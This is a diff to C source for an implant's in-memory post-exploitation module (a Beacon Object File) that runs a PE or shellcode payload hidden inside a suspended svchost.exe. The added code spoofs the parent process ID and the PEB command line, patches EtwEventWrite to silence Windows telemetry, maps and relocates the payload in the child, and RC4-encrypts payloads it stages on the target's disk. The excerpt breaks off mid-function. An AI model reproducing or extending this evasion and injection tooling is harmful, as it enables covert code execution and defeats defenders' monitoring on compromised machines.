@@ -8,6 +8,7 @@
 
 #define MODE_PE        0
 #define MODE_SHELLCODE 1
+#define MODE_UPLOAD_ENC 2
 
 #define SRC_BYTES      0
 #define SRC_LOCAL_PATH 1
@@ -15,11 +16,16 @@
 #define OUTPUT_YES     0
 #define OUTPUT_NO      1
 
-#define DEFAULT_TIMEOUT_MS 60000
+#define DEFAULT_TIMEOUT_MS 15000
 #define POLL_INTERVAL_MS   100
 #define OUTPUT_CHUNK_MAX   (1024 * 64)
 
-#define DEFAULT_SPAWNTO_A "C:\\Windows\\System32\\svchost.exe"
+#define DEFAULT_SPAWNTO_X64 "C:\\Windows\\System32\\svchost.exe"
+#define DEFAULT_SPAWNTO_X86 "C:\\Windows\\SysWOW64\\svchost.exe"
+
+/* ================================================================
+ *  Minimal libc
+ * ================================================================ */
 
 static void *xmemset(void *d, int c, size_t n) {
     unsigned char *p = (unsigned char *)d;
@@ -34,34 +40,180 @@ static void *xmemcpy(void *d, const void *s, size_t n) {
     return d;
 }
 
-/* XOR decrypt a buffer in place */
-static void XorDecrypt(BYTE *buf, DWORD len, BYTE key) {
-    for (DWORD i = 0; i < len; i++) buf[i] ^= key;
-}
 
-/* ---- Output capture ---- */
-
-static void DrainPipe(HANDLE hPipe) {
-    for (;;) {
-        DWORD avail = 0;
-        if (!KERNEL32$PeekNamedPipe(hPipe, NULL, 0, NULL, &avail, NULL) || avail == 0)
-            return;
-        DWORD toRead = (avail < OUTPUT_CHUNK_MAX) ? avail : OUTPUT_CHUNK_MAX;
-        BYTE *buf = (BYTE*)KERNEL32$LocalAlloc(0x40, toRead + 1);
-        if (!buf) return;
-        DWORD br = 0;
-        if (KERNEL32$ReadFile(hPipe, buf, toRead, &br, NULL) && br > 0) {
-            buf[br] = 0;
-            BeaconOutput(CALLBACK_OUTPUT, (char*)buf, br);
-        }
-        KERNEL32$LocalFree(buf);
-        if (br < toRead) return;
+static void RC4(BYTE *data, DWORD len, BYTE *key, DWORD keyLen) {
+    BYTE S[256];
+    for (int i = 0; i < 256; i++) S[i] = (BYTE)i;
+    for (int i = 0, j = 0; i < 256; i++) {
+        j = (j + S[i] + key[i % keyLen]) & 0xFF;
+        BYTE tmp = S[i]; S[i] = S[j]; S[j] = tmp;
+    }
+    for (DWORD k = 0, i = 0, j = 0; k < len; k++) {
+        i = (i + 1) & 0xFF;
+        j = (j + S[i]) & 0xFF;
+        BYTE tmp = S[i]; S[i] = S[j]; S[j] = tmp;
+        data[k] ^= S[(S[i] + S[j]) & 0xFF];
     }
 }
 
+/* ================================================================
+ *  Parsed PE info — abstracts 32/64 differences
+ * ================================================================ */
+
+typedef struct {
+    BOOL is64;
+    DWORD sizeOfImage;
+    DWORD sizeOfHeaders;
+    DWORD entryPointRva;
+    DWORD numberOfSections;
+    ULONG_PTR imageBase;
+    IMAGE_DATA_DIRECTORY relocDir;
+    DWORD firstSectionOffset; /* file offset to IMAGE_FIRST_SECTION from PE start */
+} PE_INFO;
+
+static BOOL ParsePE(BYTE *hdr, DWORD hdrSize, PE_INFO *info) {
+    if (hdrSize < sizeof(IMAGE_DOS_HEADER)) {
+        BeaconPrintf(CALLBACK_ERROR, "Too small");
+        return FALSE;
+    }
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hdr;
+    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
+        BeaconPrintf(CALLBACK_ERROR, "Bad MZ (0x%x)", pDos->e_magic);
+        return FALSE;
+    }
+    if ((DWORD)pDos->e_lfanew + sizeof(IMAGE_NT_HEADERS32) > hdrSize) {
+        BeaconPrintf(CALLBACK_ERROR, "e_lfanew out of range");
+        return FALSE;
+    }
+
+    PIMAGE_FILE_HEADER pFile = (PIMAGE_FILE_HEADER)(hdr + pDos->e_lfanew + 4);
+    DWORD sig = *(DWORD*)(hdr + pDos->e_lfanew);
+    if (sig != IMAGE_NT_SIGNATURE) {
+        BeaconPrintf(CALLBACK_ERROR, "Bad PE signature");
+        return FALSE;
+    }
+
+    info->numberOfSections = pFile->NumberOfSections;
+
+    if (pFile->Machine == IMAGE_FILE_MACHINE_AMD64) {
+        info->is64 = TRUE;
+        PIMAGE_NT_HEADERS64 pNt = (PIMAGE_NT_HEADERS64)(hdr + pDos->e_lfanew);
+        if ((DWORD)pDos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > hdrSize) {
+            BeaconPrintf(CALLBACK_ERROR, "NT headers out of range");
+            return FALSE;
+        }
+        info->sizeOfImage    = pNt->OptionalHeader.SizeOfImage;
+        info->sizeOfHeaders  = pNt->OptionalHeader.SizeOfHeaders;
+        info->entryPointRva  = pNt->OptionalHeader.AddressOfEntryPoint;
+        info->imageBase      = (ULONG_PTR)pNt->OptionalHeader.ImageBase;
+        info->relocDir       = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+        info->firstSectionOffset = pDos->e_lfanew + sizeof(IMAGE_NT_HEADERS64);
+    } else if (pFile->Machine == IMAGE_FILE_MACHINE_I386) {
+        info->is64 = FALSE;
+        PIMAGE_NT_HEADERS32 pNt = (PIMAGE_NT_HEADERS32)(hdr + pDos->e_lfanew);
+        if ((DWORD)pDos->e_lfanew + sizeof(IMAGE_NT_HEADERS32) > hdrSize) {
+            BeaconPrintf(CALLBACK_ERROR, "NT headers out of range");
+            return FALSE;
+        }
+        info->sizeOfImage    = pNt->OptionalHeader.SizeOfImage;
+        info->sizeOfHeaders  = pNt->OptionalHeader.SizeOfHeaders;
+        info->entryPointRva  = pNt->OptionalHeader.AddressOfEntryPoint;
+        info->imageBase      = (ULONG_PTR)pNt->OptionalHeader.ImageBase;
+        info->relocDir       = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+        info->firstSectionOffset = pDos->e_lfanew + sizeof(IMAGE_NT_HEADERS32);
+    } else {
+        BeaconPrintf(CALLBACK_ERROR, "Unsupported machine: 0x%x", pFile->Machine);
+        return FALSE;
+    }
+
+    if (info->entryPointRva == 0) {
+        BeaconPrintf(CALLBACK_ERROR, "EntryPoint is zero (managed PE?)");
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+/* ================================================================
+ *  PPID spoofing helpers
+ * ================================================================ */
+
+static DWORD FindPidByName(const char *procName) {
+    PROCESSENTRY32 pe;
+    xmemset(&pe, 0, sizeof(pe));
+    pe.dwSize = sizeof(PROCESSENTRY32);
+    HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return 0;
+    DWORD pid = 0;
+    if (KERNEL32$Process32First(hSnap, &pe)) {
+        do {
+            if (MSVCRT$_stricmp(pe.szExeFile, procName) == 0) {
+                pid = pe.th32ProcessID;
+                break;
+            }
+        } while (KERNEL32$Process32Next(hSnap, &pe));
+    }
+    KERNEL32$CloseHandle(hSnap);
+    return pid;
+}
+
+static DWORD FindSpoofParent(const char *spawntoA) {
+    const char *name = spawntoA;
+    const char *p = spawntoA;
+    while (*p) { if (*p == '\\' || *p == '/') name = p + 1; p++; }
+    if (MSVCRT$_stricmp(name, "svchost.exe") == 0) return FindPidByName("services.exe");
+    if (MSVCRT$_stricmp(name, "RuntimeBroker.exe") == 0 ||
+        MSVCRT$_stricmp(name, "dllhost.exe") == 0 ||
+        MSVCRT$_stricmp(name, "taskhostw.exe") == 0) return FindPidByName("svchost.exe");
+    return FindPidByName("explorer.exe");
+}
+
+/* ================================================================
+ *  ETW patching (per-boot ASLR, GetModuleHandleA only)
+ * ================================================================ */
+
+static BOOL PatchRemoteFunction(HANDLE hProcess, HMODULE hMod,
+                                const char *funcName, BYTE *patch, DWORD patchLen) {
+    FARPROC pFunc = KERNEL32$GetProcAddress(hMod, funcName);
+    if (!pFunc) return FALSE;
+    DWORD oldProt = 0;
+    if (!KERNEL32$VirtualProtectEx(hProcess, (LPVOID)pFunc, patchLen, PAGE_READWRITE, &oldProt))
+        return FALSE;
+    SIZE_T written = 0;
+    BOOL ok = KERNEL32$WriteProcessMemory(hProcess, (LPVOID)pFunc, patch, patchLen, &written);
+    DWORD dummy = 0;
+    KERNEL32$VirtualProtectEx(hProcess, (LPVOID)pFunc, patchLen, oldProt, &dummy);
+    return ok && (written == patchLen);
+}
+
+static void PatchETW(HANDLE hProcess) {
+    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) return;
+    BYTE patch[] = { 0x33, 0xC0, 0xC3 };
+    PatchRemoteFunction(hProcess, hNtdll, "EtwEventWrite", patch, sizeof(patch));
+}
+
+/* ================================================================
+ *  Output capture
+ * ================================================================ */
+
+static void DrainPipe(HANDLE hPipe) {
+    DWORD avail = 0;
+    if (!KERNEL32$PeekNamedPipe(hPipe, NULL, 0, NULL, &avail, NULL) || avail == 0) return;
+    if (avail > OUTPUT_CHUNK_MAX) avail = OUTPUT_CHUNK_MAX;
+    BYTE *buf = (BYTE*)KERNEL32$LocalAlloc(0x40, avail + 1);
+    if (!buf) return;
+    DWORD br = 0;
+    KERNEL32$ReadFile(hPipe, buf, avail, &br, NULL);
+    if (br > 0) {
+        buf[br] = 0;
+        BeaconOutput(CALLBACK_OUTPUT, (char*)buf, br);
+    }
+    KERNEL32$LocalFree(buf);
+}
+
 static void CollectOutput(HANDLE hProcess, HANDLE hPipe, DWORD timeoutMs) {
-    DWORD elapsed = 0;
-    DWORD exitCode = 259;
+    DWORD elapsed = 0, exitCode = 259;
     while (elapsed < timeoutMs) {
         DrainPipe(hPipe);
         KERNEL32$GetExitCodeProcess(hProcess, &exitCode);
@@ -78,7 +230,147 @@ static void CollectOutput(HANDLE hProcess, HANDLE hPipe, DWORD timeoutMs) {
     }
 }
 
-/* ---- Read file on target ---- */
+/* ================================================================
+ *  Create suspended process
+ * ================================================================ */
+
+typedef struct {
+    STARTUPINFOEXA si;
+    LPPROC_THREAD_ATTRIBUTE_LIST attrList;
+    HANDLE hParent;
+    HANDLE hPipeOutRead, hPipeOutWrite;
+    HANDLE hPipeInRead, hPipeInWrite;
+    PROCESS_INFORMATION pi;
+} SPAWN_CTX;
+
+static void SpawnCleanup(SPAWN_CTX *ctx, BOOL keepProc) {
+    if (ctx->attrList) { KERNEL32$DeleteProcThreadAttributeList(ctx->attrList); KERNEL32$LocalFree(ctx->attrList); ctx->attrList = NULL; }
+    if (ctx->hParent) { KERNEL32$CloseHandle(ctx->hParent); ctx->hParent = NULL; }
+    if (ctx->hPipeInRead) { KERNEL32$CloseHandle(ctx->hPipeInRead); ctx->hPipeInRead = NULL; }
+    if (ctx->hPipeOutWrite) { KERNEL32$CloseHandle(ctx->hPipeOutWrite); ctx->hPipeOutWrite = NULL; }
+    if (!keepProc) {
+        if (ctx->hPipeOutRead) { KERNEL32$CloseHandle(ctx->hPipeOutRead); ctx->hPipeOutRead = NULL; }
+        if (ctx->hPipeInWrite) { KERNEL32$CloseHandle(ctx->hPipeInWrite); ctx->hPipeInWrite = NULL; }
+        if (ctx->pi.hProcess) { KERNEL32$TerminateProcess(ctx->pi.hProcess, 1); KERNEL32$CloseHandle(ctx->pi.hProcess); ctx->pi.hProcess = NULL; }
+        if (ctx->pi.hThread) { KERNEL32$CloseHandle(ctx->pi.hThread); ctx->pi.hThread = NULL; }
+    }
+}
+
+static BOOL SpawnSuspended(const char *spawntoA, BOOL wantOutput,
+                           int realCmdMinBytes, SPAWN_CTX *ctx) {
+    xmemset(ctx, 0, sizeof(SPAWN_CTX));
+    ctx->si.StartupInfo.cb = sizeof(STARTUPINFOA);
+
+    SECURITY_ATTRIBUTES sa;
+    xmemset(&sa, 0, sizeof(sa));
+    sa.nLength = sizeof(sa);
+    sa.bInheritHandle = TRUE;
+
+    if (wantOutput) {
+        if (!KERNEL32$CreatePipe(&ctx->hPipeOutRead, &ctx->hPipeOutWrite, &sa, 0) ||
+            !KERNEL32$CreatePipe(&ctx->hPipeInRead, &ctx->hPipeInWrite, &sa, 0)) {
+            BeaconPrintf(CALLBACK_ERROR, "CreatePipe: %lu", KERNEL32$GetLastError());
+            SpawnCleanup(ctx, FALSE);
+            return FALSE;
+        }
+        KERNEL32$SetHandleInformation(ctx->hPipeOutRead, 1, 0);
+        KERNEL32$SetHandleInformation(ctx->hPipeInWrite, 1, 0);
+        ctx->si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+        ctx->si.StartupInfo.wShowWindow = SW_HIDE;
+        ctx->si.StartupInfo.hStdInput  = ctx->hPipeInRead;
+        ctx->si.StartupInfo.hStdOutput = ctx->hPipeOutWrite;
+        ctx->si.StartupInfo.hStdError  = ctx->hPipeOutWrite;
+    } else {
+        ctx->si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
+        ctx->si.StartupInfo.wShowWindow = SW_HIDE;
+    }
+
+    char fakeCmd[4096];
+    xmemset(fakeCmd, 0, sizeof(fakeCmd));
+    int fakeLen = MSVCRT$_snprintf(fakeCmd, sizeof(fakeCmd) - 1,
+        "%s -k LocalServiceNetworkRestricted", spawntoA);
+    if (fakeLen < 0) fakeLen = MSVCRT$strlen(fakeCmd);
+    if (realCmdMinBytes > 0 && fakeLen < realCmdMinBytes) {
+        int i;
+        for (i = fakeLen; i < realCmdMinBytes && i < (int)sizeof(fakeCmd) - 1; i++)
+            fakeCmd[i] = ' ';
+        fakeCmd[i] = '\0';
+    }
+
+    DWORD flags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
+
+    if (!KERNEL32$CreateProcessA(NULL, fakeCmd, NULL, NULL, wantOutput ? TRUE : FALSE,
+            flags, NULL, NULL, (LPSTARTUPINFOA)&ctx->si, &ctx->pi)) {
+        BeaconPrintf(CALLBACK_ERROR, "CreateProcess: %lu", KERNEL32$GetLastError());
+        SpawnCleanup(ctx, FALSE);
+        return FALSE;
+    }
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] PID %lu suspended", ctx->pi.dwProcessId);
+
+    if (ctx->hPipeOutWrite) { KERNEL32$CloseHandle(ctx->hPipeOutWrite); ctx->hPipeOutWrite = NULL; }
+    if (ctx->hPipeInRead)   { KERNEL32$CloseHandle(ctx->hPipeInRead);   ctx->hPipeInRead = NULL; }
+
+    return TRUE;
+}
+
+/* ================================================================
+ *  PEB command-line spoofing
+ * ================================================================ */
+
+static BOOL SpoofCommandLine(HANDLE hProcess, const char *realCmdA) {
+    PROCESS_BASIC_INFORMATION pbi;
+    xmemset(&pbi, 0, sizeof(pbi));
+    if (NTDLL$NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL) != 0)
+        return FALSE;
+    PEB peb;
+    SIZE_T br = 0;
+    if (!KERNEL32$ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &br))
+        return FALSE;
+    RTL_USER_PROCESS_PARAMETERS params;
+    if (!KERNEL32$ReadProcessMemory(hProcess, peb.ProcessParameters, &params, sizeof(params), &br))
+        return FALSE;
+    int wLen = KERNEL32$MultiByteToWideChar(0, 0, realCmdA, -1, NULL, 0);
+    if (wLen == 0) return FALSE;
+    LPWSTR wBuf = (LPWSTR)KERNEL32$LocalAlloc(0x40, wLen * sizeof(WCHAR));
+    if (!wBuf) return FALSE;
+    KERNEL32$MultiByteToWideChar(0, 0, realCmdA, -1, wBuf, wLen);
+    SIZE_T bw = 0;
+    KERNEL32$WriteProcessMemory(hProcess, params.CommandLine.Buffer, wBuf, wLen * sizeof(WCHAR), &bw);
+    USHORT newLen = (USHORT)((wLen - 1) * sizeof(WCHAR));
+    KERNEL32$WriteProcessMemory(hProcess,
+        (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),
+        &newLen, sizeof(USHORT), &bw);
+    KERNEL32$LocalFree(wBuf);
+    return TRUE;
+}
+
+/* ================================================================
+ *  Write PE sections to child
+ * ================================================================ */
+
+static BOOL WritePEToChild(HANDLE hProcess, BYTE *pRemote,
+                           BYTE *peData, DWORD payloadSize,
+                           BYTE *hdr, PE_INFO *info) {
+    PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)(hdr + info->firstSectionOffset);
+    SIZE_T bw = 0;
+
+    KERNEL32$WriteProcessMemory(hProcess, pRemote, peData, info->sizeOfHeaders, &bw);
+
+    for (DWORD i = 0; i < info->numberOfSections; i++) {
+        if (pSec[i].SizeOfRawData == 0) continue;
+        if (pSec[i].PointerToRawData + pSec[i].SizeOfRawData > payloadSize) continue;
+        KERNEL32$WriteProcessMemory(hProcess,
+            pRemote + pSec[i].VirtualAddress,
+            peData + pSec[i].PointerToRawData,
+            pSec[i].SizeOfRawData, &bw);
+    }
+    return TRUE;
+}
+
+/* ================================================================
+ *  Read file on target
+ * ================================================================ */
 
 static BYTE* ReadLocalFile(const char *path, DWORD *outSize) {
     *outSize = 0;
@@ -90,6 +382,7 @@ static BYTE* ReadLocalFile(const char *path, DWORD *outSize) {
     }
     DWORD sz = KERNEL32$GetFileSize(hFile, NULL);
     if (sz == 0 || sz == INVALID_FILE_SIZE) {
+        BeaconPrintf(CALLBACK_ERROR, "Bad file size for %s: %lu", path, sz);
         KERNEL32$CloseHandle(hFile);
         return NULL;
     }
@@ -106,83 +399,75 @@ static BYTE* ReadLocalFile(const char *path, DWORD *outSize) {
     return buf;
 }
 
-/* Write PE to child process, decrypting from XOR-encoded source.
-   Decrypts into a small page-sized buffer, writes, then zeros the buffer.
-   The full plaintext PE never exists in beacon memory at once. */
-static BOOL WritePEToChild(HANDLE hProcess, BYTE *pRemote,
-                           BYTE *encPayload, DWORD payloadSize,
-                           PIMAGE_NT_HEADERS pNt, BYTE xorKey) {
+/* ================================================================
+ *  Apply relocations in child process memory
+ * ================================================================ */
 
-    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
-    SIZE_T bw = 0;
+static int ApplyRelocationsRemote(HANDLE hProcess, BYTE *pRemote, PE_INFO *info, ULONG_PTR delta) {
+    if (info->relocDir.Size == 0 || info->relocDir.VirtualAddress == 0) {
+        BeaconPrintf(CALLBACK_ERROR, "Relocs needed but PE has none");
+        return -1;
+    }
 
-    if (xorKey == 0) {
-        /* No encryption — write directly (local file path) */
-        KERNEL32$WriteProcessMemory(hProcess, pRemote, encPayload,
-            pNt->OptionalHeader.SizeOfHeaders, &bw);
-        for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
-            if (pSec[i].SizeOfRawData == 0) continue;
-            KERNEL32$WriteProcessMemory(hProcess,
-                pRemote + pSec[i].VirtualAddress,
-                encPayload + pSec[i].PointerToRawData,
-                pSec[i].SizeOfRawData, &bw);
+    BYTE *relocData = (BYTE*)KERNEL32$LocalAlloc(0x40, info->relocDir.Size);
+    if (!relocData) return -1;
+
+    SIZE_T rr = 0;
+    KERNEL32$ReadProcessMemory(hProcess,
+        pRemote + info->relocDir.VirtualAddress, relocData, info->relocDir.Size, &rr);
+
+    BYTE *pBlock = relocData;
+    DWORD processed = 0;
+    int count = 0;
+
+    while (processed < info->relocDir.Size) {
+        DWORD pageRva   = *(DWORD*)(pBlock);
+        DWORD blockSize = *(DWORD*)(pBlock + 4);
+        if (blockSize == 0 || blockSize < 8) break;
+        DWORD entries = (blockSize - 8) / 2;
+        WORD *entry = (WORD*)(pBlock + 8);
+
+        BYTE pageBuf[4096];
+        DWORD pageSize = 4096;
+        if (pageRva + pageSize > info->sizeOfImage)
+            pageSize = info->sizeOfImage - pageRva;
+        SIZE_T pbr = 0;
+        KERNEL32$ReadProcessMemory(hProcess, pRemote + pageRva, pageBuf, pageSize, &pbr);
+
+        BOOL modified = FALSE;
+        for (DWORD j = 0; j < entries; j++) {
+            BYTE type = (BYTE)(entry[j] >> 12);
+            WORD off  = entry[j] & 0xFFF;
+            if (type == IMAGE_REL_BASED_DIR64 && off + 8 <= pageSize) {
+                *(ULONG_PTR*)(pageBuf + off) += delta;
+                count++; modified = TRUE;
+            } else if (type == IMAGE_REL_BASED_HIGHLOW && off + 4 <= pageSize) {
+                *(DWORD*)(pageBuf + off) += (DWORD)delta;
+                count++; modified = TRUE;
+            } else if (type == IMAGE_REL_BASED_ABSOLUTE) {
+                /* padding, skip */
+            }
         }
-        return TRUE;
-    }
 
-    /* Encrypted: decrypt + write in chunks, never hold full plaintext.
-       Use a 4KB temp buffer — decrypt chunk, write, zero. */
-    #define CHUNK 4096
-    BYTE *tmp = (BYTE*)KERNEL32$LocalAlloc(0x40, CHUNK);
-    if (!tmp) return FALSE;
-
-    /* Write headers */
-    DWORD hdrSize = pNt->OptionalHeader.SizeOfHeaders;
-    DWORD off = 0;
-    while (off < hdrSize) {
-        DWORD n = (hdrSize - off < CHUNK) ? (hdrSize - off) : CHUNK;
-        xmemcpy(tmp, encPayload + off, n);
-        XorDecrypt(tmp, n, xorKey);
-        KERNEL32$WriteProcessMemory(hProcess, pRemote + off, tmp, n, &bw);
-        xmemset(tmp, 0, n);
-        off += n;
-    }
-
-    /* Write sections */
-    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
-        if (pSec[i].SizeOfRawData == 0) continue;
-        DWORD secOff = 0;
-        DWORD rawOff = pSec[i].PointerToRawData;
-        DWORD rawSz  = pSec[i].SizeOfRawData;
-        while (secOff < rawSz) {
-            DWORD n = (rawSz - secOff < CHUNK) ? (rawSz - secOff) : CHUNK;
-            xmemcpy(tmp, encPayload + rawOff + secOff, n);
-            XorDecrypt(tmp, n, xorKey);
-            KERNEL32$WriteProcessMemory(hProcess,
-                pRemote + pSec[i].VirtualAddress + secOff, tmp, n, &bw);
-            xmemset(tmp, 0, n);
-            secOff += n;
+        if (modified) {
+            SIZE_T bw = 0;
+            KERNEL32$WriteProcessMemory(hProcess, pRemote + pageRva, pageBuf, pageSize, &bw);
         }
-    }
 
-    KERNEL32$LocalFree(tmp);
-    return TRUE;
+        pBlock += blockSize;
+        processed += blockSize;
+    }
+    KERNEL32$LocalFree(relocData);
+    return count;
 }
 
 /* ================================================================
  *  BOF entry
  *
- *  Args from .axs (bof_pack):
- *    int  mode       0=PE, 1=shellcode
- *    int  source     0=bytes, 1=local path
- *    int  noOutput   0=capture, 1=no
- *    int  timeout_ms
- *    int  xorKey     0=none, 1-255=XOR key for payload bytes
- *    int  (unused)
- *    cstr spawnto
- *    cstr args
- *    cstr localPath
- *    bytes payload   (XOR encrypted if xorKey != 0)
+ *  Args (bof_pack): mode, source, noOutput, timeout, flags, unused,
+ *                   spawnto, args, localPath, payload
+ *
+ *  flags bit 0: force x86 (for shellcode — PE auto-detects)
  * ================================================================ */
 
 void go(char *rawArgs, int rawLen) {
@@ -193,7 +478,7 @@ void go(char *rawArgs, int rawLen) {
     int source     = BeaconDataInt(&parser);
     int noOutput   = BeaconDataInt(&parser);
     int timeoutMs  = BeaconDataInt(&parser);
-    int xorKey     = BeaconDataInt(&parser);
+    int flags      = BeaconDataInt(&parser);
     int unused     = BeaconDataInt(&parser);
 
     int spawntoLen = 0;
@@ -205,384 +490,419 @@ void go(char *rawArgs, int rawLen) {
     int peDataLen = 0;
     char *peData     = BeaconDataExtract(&parser, &peDataLen);
 
-    const char *spawntoA = DEFAULT_SPAWNTO_A;
-    if (spawnto && spawnto[0]) spawntoA = spawnto;
     if (timeoutMs <= 0) timeoutMs = DEFAULT_TIMEOUT_MS;
     BOOL wantOutput = (noOutput != OUTPUT_NO);
-    BYTE xkey = (BYTE)(xorKey & 0xFF);
+    BOOL forceX86 = (flags & 1);
+    BOOL decryptLocal = (flags & 2);
 
     /* ---- Get payload ---- */
     BYTE *payload = NULL;
     DWORD payloadSize = 0;
     BOOL freePayload = FALSE;
+    BYTE *payloadAllocBase = NULL;
 
     if (source == SRC_LOCAL_PATH) {
-        if (!localPath || !localPath[0]) {
-            BeaconPrintf(CALLBACK_ERROR, "No local path");
-            return;
-        }
+        if (!localPath || !localPath[0]) { BeaconPrintf(CALLBACK_ERROR, "No local path"); return; }
+        DWORD t0 = KERNEL32$GetTickCount();
         payload = ReadLocalFile(localPath, &payloadSize);
+        DWORD t1 = KERNEL32$GetTickCount();
         if (!payload) return;
         freePayload = TRUE;
-        xkey = 0; /* local files are not encrypted */
-    } else {
-        if (!peData || peDataLen <= 0) {
-            BeaconPrintf(CALLBACK_ERROR, "No payload bytes");
-            return;
+        payloadAllocBase = payload;
+
+        if (decryptLocal && payloadSize <= 16) {
+            BeaconPrintf(CALLBACK_ERROR, "Encrypted file too small (%lu bytes, need >16)", payloadSize);
+            goto cleanup;
         }
+        if (decryptLocal && payloadSize > 16) {
+            BYTE key[16];
+            xmemcpy(key, payload, 16);
+            payload += 16;
+            payloadSize -= 16;
+            RC4(payload, payloadSize, key, 16);
+            xmemset(key, 0, 16);
+            DWORD t2 = KERNEL32$GetTickCount();
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] read=%lums rc4=%lums size=%lu", t1-t0, t2-t1, payloadSize);
+        }
+    } else {
+        if (!peData || peDataLen <= 0) { BeaconPrintf(CALLBACK_ERROR, "No payload bytes"); return; }
         payload = (BYTE*)peData;
         payloadSize = (DWORD)peDataLen;
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] %s | %lu bytes | output=%s | xor=0x%02x",
-        mode == MODE_PE ? "PE" : "Shellcode",
-        payloadSize, wantOutput ? "yes" : "no", xkey);
-
-    /* ---- For PE validation, we need to peek at the decrypted headers ---- */
-    BYTE hdrBuf[4096];
-    DWORD hdrPeek = (payloadSize < sizeof(hdrBuf)) ? payloadSize : sizeof(hdrBuf);
-    xmemcpy(hdrBuf, payload, hdrPeek);
-    if (xkey) XorDecrypt(hdrBuf, hdrPeek, xkey);
-
-    if (mode == MODE_PE) {
-        if (hdrPeek < sizeof(IMAGE_DOS_HEADER)) {
-            BeaconPrintf(CALLBACK_ERROR, "Too small");
+    /* ---- MODE_UPLOAD_ENC: encrypt and write to target disk, then exit ---- */
+    if (mode == MODE_UPLOAD_ENC) {
+        if (!localPath || !localPath[0]) {
+            BeaconPrintf(CALLBACK_ERROR, "No target path for --upload-enc (use --enc-path)");
             goto cleanup;
         }
-        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hdrBuf;
-        if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
-            BeaconPrintf(CALLBACK_ERROR, "Bad MZ (0x%x) — wrong XOR key?", pDos->e_magic);
+
+        BYTE key[16];
+        ADVAPI32$SystemFunction036(key, sizeof(key));
+
+        BYTE *encBuf = (BYTE*)KERNEL32$LocalAlloc(0x40, payloadSize);
+        if (!encBuf) { BeaconPrintf(CALLBACK_ERROR, "LocalAlloc: %lu", KERNEL32$GetLastError()); goto cleanup; }
+        xmemcpy(encBuf, payload, payloadSize);
+        RC4(encBuf, payloadSize, key, 16);
+
+        HANDLE hFile = KERNEL32$CreateFileA(localPath, GENERIC_WRITE, 0,
+            NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile == INVALID_HANDLE_VALUE) {
+            BeaconPrintf(CALLBACK_ERROR, "CreateFile %s: %lu", localPath, KERNEL32$GetLastError());
+            KERNEL32$LocalFree(encBuf);
             goto cleanup;
         }
-        if ((DWORD)pDos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > hdrPeek) {
-            BeaconPrintf(CALLBACK_ERROR, "e_lfanew out of header peek range");
-            goto cleanup;
-        }
-        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(hdrBuf + pDos->e_lfanew);
-        if (pNt->Signature != IMAGE_NT_SIGNATURE) {
-            BeaconPrintf(CALLBACK_ERROR, "Bad PE sig");
-            goto cleanup;
-        }
-        if (pNt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
-            BeaconPrintf(CALLBACK_ERROR, "Not x64");
-            goto cleanup;
-        }
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] PE OK: entry=0x%lx image=0x%lx sections=%d",
-            pNt->OptionalHeader.AddressOfEntryPoint,
-            pNt->OptionalHeader.SizeOfImage,
-            pNt->FileHeader.NumberOfSections);
-    }
-    /* Zero the header peek buffer immediately */
-    xmemset(hdrBuf, 0, sizeof(hdrBuf));
 
-    /* ---- Create process suspended ---- */
-    SECURITY_ATTRIBUTES sa;
-    xmemset(&sa, 0, sizeof(sa));
-    sa.nLength = sizeof(sa);
-    sa.bInheritHandle = TRUE;
+        DWORD bw = 0;
+        KERNEL32$WriteFile(hFile, key, 16, &bw, NULL);
+        KERNEL32$WriteFile(hFile, encBuf, payloadSize, &bw, NULL);
+        KERNEL32$CloseHandle(hFile);
 
-    HANDLE hPipeRead = NULL, hPipeWrite = NULL;
-    STARTUPINFOA si;
-    xmemset(&si, 0, sizeof(si));
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
+        xmemset(key, 0, 16);
+        xmemset(encBuf, 0, payloadSize);
+        KERNEL32$LocalFree(encBuf);
 
-    if (wantOutput) {
-        HANDLE hInR = NULL, hInW = NULL;
-        if (!KERNEL32$CreatePipe(&hPipeRead, &hPipeWrite, &sa, 0)) {
-            BeaconPrintf(CALLBACK_ERROR, "CreatePipe: %lu", KERNEL32$GetLastError());
-            goto cleanup;
-        }
-        KERNEL32$CreatePipe(&hInR, &hInW, &sa, 0);
-        KERNEL32$SetHandleInformation(hPipeRead, 1, 0);
-        if (hInW) KERNEL32$SetHandleInformation(hInW, 1, 0);
-
-        si.dwFlags |= STARTF_USESTDHANDLES;
-        si.hStdInput  = hInR;
-        si.hStdOutput = hPipeWrite;
-        si.hStdError  = hPipeWrite;
-    }
-
-    char cmdLine[512];
-    xmemset(cmdLine, 0, sizeof(cmdLine));
